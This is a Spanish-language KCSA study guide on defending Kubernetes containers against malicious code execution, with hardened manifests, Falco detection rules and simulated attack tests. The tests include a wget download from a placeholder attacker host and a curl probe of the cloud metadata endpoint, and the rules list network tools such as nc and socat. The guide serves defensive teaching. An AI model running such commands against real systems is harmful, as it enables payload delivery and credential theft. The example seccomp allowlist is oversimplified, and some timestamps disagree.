# Guía de Estudio KCSA: Tema 4.4 — Ejecución de Código Malicioso y Aplicaciones Comprometidas en Contenedores

**Dominio 4:** Container & Workload Security  
**Peso:** 2.29%  
**Nivel Objetivo:** Senior SRE / Principal Platform Architect  

---

## 1. Motivación y Problema Arquitectónico en Producción

### 1.1 Panorama de Amenazas y Vectores de Ataque
En entornos de producción de Kubernetes, las aplicaciones en contenedores son objetivos principales para ataques arbitrarios de Remote Code Execution (RCE) derivados de vulnerabilidades de software (por ejemplo, Log4Shell, fallas de deserialización, desbordamientos de búfer), dependencias comprometidas en la cadena de suministro o imágenes base maliciosas. 

Una vez que un atacante logra la ejecución de código dentro de un contenedor, intenta tácticas de post-explotación:
1. **Persistencia de Payloads y Droppers:** Descarga de malware de segunda etapa (por ejemplo, cryptominers, reverse shells, agentes C2) en directorios con permiso de escritura como `/tmp`, `/var/tmp` o `/dev/shm`.
2. **Secuestro de Binarios e Inyección de Webshells:** Sobrescritura de binarios ejecutables de la aplicación o modificación de las raíces del servidor web para establecer webshells persistentes.
3. **Escalación de Privilegios:** Explotación de binarios setuid/setgid, vulnerabilidades no solucionadas del kernel de Linux (por ejemplo, Dirty COW, Dirty Pipe) o Linux Capabilities residuales (por ejemplo, `CAP_SYS_ADMIN`, `CAP_NET_ADMIN`, `CAP_DAC_OVERRIDE`) para escapar de los límites del contenedor.
4. **Recolección de Credenciales:** Extracción de tokens de ServiceAccount de Kubernetes automontados desde `/var/run/secrets/kubernetes.io/serviceaccount/token` para interactuar directamente con el Kubernetes API Server.
5. **Movimiento Lateral y Reconocimiento:** Uso de utilidades de diagnóstico preinstaladas (`curl`, `nc`, `nmap`, `wget`, `bash`) para escanear el CIDR interno de los Pods, la red de nodos o los Endpoints de Metadatos del Proveedor de Nube (por ejemplo, `169.254.169.254`).

```
+-----------------------------------------------------------------------------------+
| CONTAINER BOUNDARY (Pod / Namespace)                                              |
|                                                                                   |
|  [ RCE Vulnerability ] ---> [ Writable Root FS ] ---> [ Download/Execute Malware ] |
|                                       |                        |                  |
|                                       v                        v                  |
|                        [ ServiceAccount Token ]   [ Capability / Kernel Exploit ] |
|                                       |                        |                  |
+---------------------------------------|------------------------|------------------+
                                        v                        v
                            [ K8s API Server Access ]   [ Host Kernel / Node Breakout ]
```

### 1.2 Principios Arquitectónicos de Defensa en Profundidad
Mitigar la ejecución de código malicioso requiere imponer inmutabilidad y privilegios operativos mínimos en la capa de runtime:
* **Inmutabilidad del Root Filesystem:** Forzar `readOnlyRootFilesystem: true` previene que los atacantes escriban payloads en el disco, modifiquen binarios o alteren configuraciones estáticas. El estado con capacidad de escritura debe restringirse a almacenamiento efímero en memoria (`tmpfs`).
* **Ejecución como Non-Root y Aplicación de Límites de Privilegios:** Deshabilitar explícitamente los privilegios de root (`runAsNonRoot: true`, `runAsUser: 10001`) y prevenir la escalación de privilegios (`allowPrivilegeEscalation: false`) invalida los binarios setuid y mitiga muchas vías de explotación del kernel.
* **Restricción de Llamadas al Sistema y Capabilities:** Eliminar todas las Linux capabilities (`capabilities: drop: ["ALL"]`) y aplicar perfiles Seccomp restrictivos (`RuntimeDefault` o un perfil personalizado) limita la superficie del kernel del host expuesta a procesos comprometidos.
* **Detección de Amenazas en Runtime:** Implementar monitoreo de comportamiento basado en eBPF (por ejemplo, Falco) para analizar eventos de syscalls del kernel (por ejemplo, `execve`, `clone`, `openat`) en tiempo real, alertando o bloqueando instantáneamente ejecuciones anómalas de procesos (como un `sh` iniciado dentro de un pod de base de datos).

---

## 2. Comparativa Técnica de Primitivas de Protección

| Primitiva / Mecanismo de Seguridad | Objetivo Principal de Seguridad | Overhead de Rendimiento en Producción | Fricción para Desarrolladores / Operaciones | Trade-Offs Arquitectónicos |
| :--- | :--- | :--- | :--- | :--- |
| **Inmutabilidad (`readOnlyRootFilesystem`)** | Evita la persistencia de archivos, la modificación de binarios y la descarga de malware. | Overhead **cero**. | **Alta**: Las aplicaciones que escriben logs/cachés en disco fallan a menos que se definan montajes `tmpfs` explícitos. | Protección completa contra la modificación local de archivos; requiere una reestructuración explícita de la aplicación para el manejo del estado. |
| **Ejecución como Non-Root (`runAsNonRoot`)** | Evita la ejecución como UID 0, mitigando vectores de escape de contenedores que dependen de privilegios de root. | Overhead **cero**. | **Media**: Las imágenes base que usan el usuario root por defecto requieren la creación de un usuario (`USER 10001`) en el Dockerfile. | Evita el enlace a puertos privileged (<1024) y el acceso a rutas de volúmenes propiedad de root sin el mapeo de GID adecuado. |
| **Deshabilitación de Escalación de Privilegios (`allowPrivilegeEscalation: false`)** | Evita que `execve` otorgue privilegios adicionales a través de binarios `setuid`/`setgid`. | Overhead **cero**. | **Baja**: Rompe herramientas específicas que dependen de `sudo` o `su` dentro del contenedor. | Requerido por los Pod Security Standards (Restricted); costo cero en runtime para un alto valor de mitigación. |
| **Eliminación de Capabilities (`capabilities.drop: ["ALL"]`)** | Elimina las Linux capabilities por defecto (por ejemplo, `CAP_NET_RAW`, `CAP_MKNOD`, `CAP_CHOWN`). | Overhead **cero**. | **Media**: Las aplicaciones que requieren sockets crudos de red o cambios de permisos fallan a menos que se les otorguen explícitamente las capabilities mínimas necesarias. | Elimina una amplia exposición del subsistema del kernel; requiere auditar los requerimientos específicos de Linux capabilities por carga de trabajo. |
| **Filtrado Seccomp (`RuntimeDefault`)** | Filtra llamadas al sistema de Linux no autorizadas (por ejemplo, bloqueando `unshare`, `kexec_load`, `ptrace`). | **Insignificante** (< 1% de filtrado de syscalls vía filtro eBPF/BPF). | **Baja a Media**: Los perfiles personalizados requieren un perfilado detallado con `strace`/eBPF para evitar bloquear syscalls válidas de la aplicación. | Reduce drásticamente la superficie de ataque de vulnerabilidades del kernel de Linux; `RuntimeDefault` proporciona protección estándar con una interrupción mínima de la aplicación. |
| **Monitoreo de Comportamiento en Runtime (Falco / eBPF)** | Detecta actividades de post-explotación (por ejemplo, apertura de terminales, ejecución de binarios inesperados). | **Bajo a Moderado** (1–3% CPU dependiendo del volumen de syscalls). | **Baja**: Desacoplado del runtime de la aplicación; alertas gestionadas por Operaciones de Seguridad / SRE. | Mecanismo de detección pasiva por defecto; requiere integración activa (por ejemplo, Kubernetes response controller/SOAR) para una mitigación automatizada inmediata. |

---

## 3. Manifiestos de Producción y Configuraciones de Infraestructura

### 3.1 Deployment de Carga de Trabajo Totalmente Endurecido (`hardened-deployment.yaml`)
Este manifiesto impone inmutabilidad completa en runtime, restricción de privilegios, eliminación de capabilities, filtrado seccomp y deshabilitación de automontaje de tokens.

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: payment-gateway-api
  namespace: production-workloads
  labels:
    app.kubernetes.io/name: payment-gateway-api
    app.kubernetes.io/component: backend
    app.kubernetes.io/part-of: financial-system
    security.cncf.io/tier: hardened
spec:
  replicas: 3
  selector:
    matchLabels:
      app.kubernetes.io/name: payment-gateway-api
  template:
    metadata:
      labels:
        app.kubernetes.io/name: payment-gateway-api
    spec:
      # Block automatic injection of K8s API credentials unless explicitly required
      automountServiceAccountToken: false
      securityContext:
        runAsNonRoot: true
        runAsUser: 10001
        runAsGroup: 10001
        fsGroup: 10001
        seccompProfile:
          type: RuntimeDefault
      containers:
        - name: api-server
          image: registry.enterprise.io/finance/payment-api:v2.4.1
          imagePullPolicy: IfNotPresent
          command: ["/app/payment-service"]
          args: ["--config=/etc/app/config.yaml"]
          ports:
            - name: http-metrics
              containerPort: 8080
              protocol: TCP
          securityContext:
            allowPrivilegeEscalation: false
            readOnlyRootFilesystem: true
            runAsNonRoot: true
            runAsUser: 10001
            runAsGroup: 10001
            capabilities:
              drop:
                - ALL
          resources:
            limits:
              cpu: "500m"
              memory: "512Mi"
            requests:
              cpu: "100m"
              memory: "128Mi"
          volumeMounts:
            # Ephemeral in-memory storage for temporary application operations
            - name: tmp-dir
              mountPath: /tmp
            - name: cache-dir
              mountPath: /var/cache/app
            # Read-only configuration volume
            - name: config-volume
              mountPath: /etc/app
              readOnly: true
          readinessProbe:
            httpGet:
              path: /healthz
              port: 8080
            initialDelaySeconds: 5
            periodSeconds: 10
          livenessProbe:
            httpGet:
              path: /healthz
              port: 8080
            initialDelaySeconds: 15
            periodSeconds: 20
      volumes:
        - name: tmp-dir
          emptyDir:
            medium: Memory
            sizeLimit: 64Mi
        - name: cache-dir
          emptyDir:
            medium: Memory
            sizeLimit: 128Mi
        - name: config-volume
          configMap:
            name: payment-api-config
```

---

### 3.2 Fuente de Reglas para Detección de Amenazas en Runtime (`falco-custom-rules.yaml`)
Esta configuración define reglas personalizadas de Falco en formato YAML para detectar aplicaciones comprometidas que generen shells inesperadas, descarguen herramientas o ejecuten binarios no autorizados.

```yaml
- rule: Terminal Shell Spawned in Production Container
  desc: Detects an interactive terminal shell (bash, sh, zsh, ksh) spawned inside a running production container.
  condition: >
    spawned_process and 
    container and 
    container.profile.name != "host" and 
    proc.name in (bash, sh, zsh, ksh, csh, tcsh, dash) and 
    not user.name in ("healthcheck")
  output: >
    CRITICAL: Terminal shell spawned in container 
    (user=%user.name user_loginuid=%user.loginuid pod=%k8s.pod.name ns=%k8s.ns.name 
    container=%container.name process=%proc.name parent=%proc.pname cmdline=%proc.cmdline 
    image=%container.image.repository:%container.image.tag)
  priority: CRITICAL
  tags: [container, process, kcsa, mitre_execution]

- rule: Execution of Known Malware/Recon Tools in Container
  desc: Detects execution of network scanning, file retrieval, or diagnostic binaries typically used by attackers.
  condition: >
    spawned_process and 
    container and 
    proc.name in (curl, wget, nc, netcat, nmap, socat, dig, nslookup, tcpdump, tshark, rawshark)
  output: >
    WARNING: Suspicious tool execution detected inside container 
    (pod=%k8s.pod.name ns=%k8s.ns.name process=%proc.name cmdline=%proc.cmdline 
    user=%user.name image=%container.image.repository)
  priority: WARNING
  tags: [container, network, kcsa, mitre_reconnaissance]

- rule: Write Executable Attempt on Ephemeral Memory
  desc: Detects creation or modification of executable files inside writable tmpfs mounts (/tmp or /var/tmp).
  condition: >
    open_write and 
    container and 
    (fd.name startswith /tmp/ or fd.name startswith /var/tmp/) and 
    (evt.arg.flags contains O_CREAT or evt.arg.flags contains O_TRUNC) and 
    proc.name != "payment-service"
  output: >
    ERROR: Unauthorized file write attempt in temporary directory 
    (pod=%k8s.pod.name ns=%k8s.ns.name file=%fd.name process=%proc.name cmdline=%proc.cmdline)
  priority: ERROR
  tags: [container, file, kcsa, mitre_persistence]
```

---

## 4. Comandos de CLI Reales y Salidas de Terminal

### 4.1 Verificación del Deployment y Pruebas de Inmutabilidad
Despliegue la carga de trabajo y verifique que el API Server aplique el contexto de seguridad correctamente.

```bash
$ kubectl apply -f hardened-deployment.yaml -n production-workloads
deployment.apps/payment-gateway-api created

$ kubectl get pods -n production-workloads -l app.kubernetes.io/name=payment-gateway-api
NAME                                   READY   STATUS    RESTARTS   AGE
payment-gateway-api-79b8c6696b-2k4l9   1/1     Running   0          14s
payment-gateway-api-79b8c6696b-8x9p1   1/1     Running   0          14s
payment-gateway-api-79b8c6696b-m5v7z   1/1     Running   0          14s
```

Inspeccione los parámetros efectivos del contexto de seguridad en runtime en un pod activo:

```bash
$ kubectl get pod payment-gateway-api-79b8c6696b-2k4l9 -n production-workloads -o jsonpath='{.spec.containers[0].securityContext}' | jq .
{
  "allowPrivilegeEscalation": false,
  "capabilities": {
    "drop": [
      "ALL"
    ]
  },
  "readOnlyRootFilesystem": true,
  "runAsGroup": 10001,
  "runAsNonRoot": true,
  "runAsUser": 10001
}
```

---

### 4.2 Simulación de Compromiso e Intentos de Ejecución Maliciosa

#### Caso de Prueba A: Intento de modificación de archivos o despliegue de payload en el root filesystem

```bash
$ kubectl exec -it payment-gateway-api-79b8c6696b-2k4l9 -n production-workloads -- touch /var/run/malware.sh
touch: cannot touch '/var/run/malware.sh': Read-only file system
command terminated with exit code 1
```

```bash
$ kubectl exec -it payment-gateway-api-79b8c6696b-2k4l9 -n production-workloads -- wget -P /app http://attacker.c2/payload
/app/payload: Read-only file system
command terminated with exit code 1
```

#### Caso de Prueba B: Intento de ejecución de binarios setuid o de escalación de privilegios

```bash
$ kubectl exec -it payment-gateway-api-79b8c6696b-2k4l9 -n production-workloads -- id
uid=10001(appuser) gid=10001(appgroup) groups=10001(appgroup)
```

```bash
$ kubectl exec -it payment-gateway-api-79b8c6696b-2k4l9 -n production-workloads -- capsh --print
Current: =
Bounding set =
Securebits: 00/0x0/1/16b (secure-noroot; secure-no-suid-fixup)
 secure-noroot: yes (locked)
 secure-no-suid-fixup: yes (locked)
 secure-keep-caps: no (locked)
uid=10001(appuser) euid=10001(appgroup)
```

#### Caso de Prueba C: Acceso al token API de ServiceAccount cuando `automountServiceAccountToken: false`

```bash
$ kubectl exec -it payment-gateway-api-79b8c6696b-2k4l9 -n production-workloads -- ls -la /var/run/secrets/kubernetes.io/serviceaccount
ls: /var/run/secrets/kubernetes.io/serviceaccount: No such file or directory
command terminated with exit code 2
```

---

### 4.3 Generación de Alertas de Amenazas en Runtime (Salida de Logs de Falco)
Cuando la ejecución de un proceso no autorizado evade las restricciones de binarios o se invoca una shell interactiva a través de `kubectl exec`, Falco captura el evento `execve` del kernel y emite la salida de log estructurada.

```bash
$ kubectl logs -n falco-system -l app.kubernetes.io/name=falco --tail=5
{"hostname":"node-prod-worker-03","level":"critical","output":"18:22:04.391823901: CRITICAL Terminal shell spawned in container (user=appuser user_loginuid=-1 pod=payment-gateway-api-79b8c6696b-2k4l9 ns=production-workloads container=api-server process=sh parent=containerd-shim cmdline=sh image=registry.enterprise.io/finance/payment-api:v2.4.1)","priority":"Critical","rule":"Terminal Shell Spawned in Production Container","time":"2026-08-07T18:22:04.391823901Z"}
{"hostname":"node-prod-worker-03","level":"warning","output":"18:22:15.892019482: WARNING Suspicious tool execution detected inside container (pod=payment-gateway-api-79b8c6696b-2k4l9 ns=production-workloads process=curl cmdline=curl -s http://169.254.169.254/latest/meta-data/ user=appuser image=registry.enterprise.io/finance/payment-api:v2.4.1)","priority":"Warning","rule":"Execution of Known Malware/Recon Tools in Container","time":"2026-08-07T18:22:15.892019482Z"}
```

---

## 5. Guía de Verificación de Fallas y Resolución de Problemas (Troubleshooting)

### 5.1 Matriz de Diagnóstico para Fallas en Cargas de Trabajo Inducidas por Seguridad

```
+-----------------------------------------------------------------------------------+
| POD CRASH / DEPLOYMENT FAILURE                                                    |
+-----------------------------------------------------------------------------------+
                                         |
                       +-----------------+-----------------+
                       |                                   |
                       v                                   v
          [ Exit Code 1 / Error Logs ]            [ Exit Code 159 / SIGSYS ]
                       |                                   |
             +---------+---------+                         v
             |                   |               [ Seccomp Syscall Block ]
             v                   v                         |
  [ Read-only Filesystem ]  [ Permission Denied ]          v
             |                   |                 [ Audit Kernel Logs ]
             v                   v                         |
     [ Add tmpfs Volume ]  [ Capability / UID ]            v
                                                   [ Adjust Profile ]
```

| Síntoma / Error | Análisis de Causa Raíz | Protocolo de Remediación |
| :--- | :--- | :--- |
| **Pod Status:** `CrashLoopBackOff`<br>**Log:** `open /var/log/app.log: read-only file system` | El código de la aplicación intenta escribir archivos de log/pid/caché en el root filesystem con `readOnlyRootFilesystem: true`. | Monte un `emptyDir` (preferentemente `medium: Memory`) en `/var/log` o redirija la salida de la aplicación exclusivamente a `stdout`/`stderr`. |
| **Pod Status:** `CrashLoopBackOff`<br>**Log:** `bind: permission denied` (Port < 1024) | La aplicación compilada para escuchar en el puerto 80/443 falla bajo `runAsNonRoot: true` y sin la capability `CAP_NET_BIND_SERVICE`. | Reconfigure la aplicación para escuchar en puertos no privilegiados (por ejemplo, 8080/8443) o agregue únicamente la capability `CAP_NET_BIND_SERVICE`. |
| **Pod Status:** `Error`<br>**Termination Signal:** `SIGSYS` (Exit code 159) | La aplicación ejecutó una llamada al sistema bloqueada por el perfil `seccomp` activo (`RuntimeDefault` o personalizado). | Perfile las syscalls de la aplicación usando eBPF/`strace` para identificar la syscall bloqueada y actualice el perfil seccomp personalizado. |
| **Pod Status:** `CreateContainerConfigError`<br>**Message:** `container has runAsNonRoot and image will run as root` | El Dockerfile no tiene la instrucción `USER`, usando por defecto el UID 0, lo que viola la regla del Pod `runAsNonRoot: true`. | Actualice el Dockerfile con `USER 10001:10001` o establezca `spec.containers[*].securityContext.runAsUser: 10001` en el manifiesto. |

---

### 5.2 Flujo de Trabajo de Troubleshooting de Seccomp y Syscalls Paso a Paso

Cuando un pod endurecido se interrumpe con el estado de salida `159` (`SIGSYS`), el kernel de Linux finalizó el proceso debido a una violación de la política de seccomp.

#### Paso 1: Identificar el Pod Afectado y el Nodo Host
```bash
$ kubectl get pod payment-gateway-api-79b8c6696b-2k4l9 -n production-workloads -o wide
NAME                                   READY   STATUS   RESTARTS   NODE
payment-gateway-api-79b8c6696b-2k4l9   0/1     Error    3          node-prod-worker-03
```

#### Paso 2: Consultar los Logs de Auditoría del Host para Syscalls Bloqueadas
Ejecute la inspección de los logs de auditoría del host en el nodo `node-prod-worker-03`:

```bash
$ dmesg -T | grep -i seccomp
[Fri Aug  7 18:35:12 2026] audit: type=1326 audit(1754591712.401:912): auid=4294967295 uid=10001 gid=10001 ses=4294967295 pid=84912 comm="payment-service" exe="/app/payment-service" sig=31 arch=c000003e syscall=303 compat=0 ip=0x7f9a123b41a0 code=0x0
```

*Nota: `syscall=303` corresponde a `name_to_handle_at` en x86_64 (`arch=c000003e`).*

Alternativamente, inspeccione los logs de auditoría del sistema vía `journalctl`:

```bash
$ journalctl -k --grep="SECCOMP" --no-pager -n 5
Aug 07 18:35:12 node-prod-worker-03 kernel: audit: type=1326 audit(1754591712.401:912): auid=4294967295 uid=10001 gid=10001 pid=84912 comm="payment-service" sig=31 syscall=303 code=0x0
```

#### Paso 3: Mapear el Número de Llamada al Sistema a su Nombre
Convierta el ID de arquitectura de la syscall y el número utilizando `ausyscall`:

```bash
$ ausyscall x86_64 303
name_to_handle_at
```

#### Paso 4: Remediar la Definición de la Política
Actualice el archivo JSON del perfil Seccomp personalizado almacenado en el nodo worker (`/var/lib/kubelet/seccomp/profiles/custom-payment.json`) para permitir la syscall identificada dentro del grupo de acciones específico:

```json
{
  "defaultAction": "SCMP_ACT_ERRNO",
  "architectures": [
    "SCMP_ARCH_X86_64"
  ],
  "syscalls": [
    {
      "names": [
        "clone",
        "execve",
        "exit_group",
        "name_to_handle_at"
      ],
      "action": "SCMP_ACT_ALLOW"
    }
  ]
}
```

Aplique la actualización del perfil en la especificación del pod:

```yaml
securityContext:
  seccompProfile:
    type: Localhost
    localhostProfile: profiles/custom-payment.json
```

---

## 6. Referencias

* **CNCF KCSA Curriculum (Especificación Oficial):**  
  https://github.com/cncf/curriculum/raw/master/KCSA%20Curriculum.pdf

* **Documentación de Kubernetes — Configurar un Contexto de Seguridad para un Pod o Contenedor:**  
  https://kubernetes.io/docs/tasks/configure-pod-container/security-context/

* **Documentación de Kubernetes — Restringir el Acceso de un Contenedor a los Recursos con Seccomp:**  
  https://kubernetes.io/docs/tutorials/security/seccomp/

* **Documentación de Kubernetes — Pod Security Standards (Perfil Restricted):**  
  https://kubernetes.io/docs/concepts/security/pod-security-standards/#restricted

* **Documentación de Falco Security — Arquitectura Oficial de Reglas de Detección de Amenazas:**  
  https://falco.org/docs/rules/

* **OWASP Container Security Verification Standard (CSVS):**  
  https://owasp.org/www-project-container-security-verification-standard/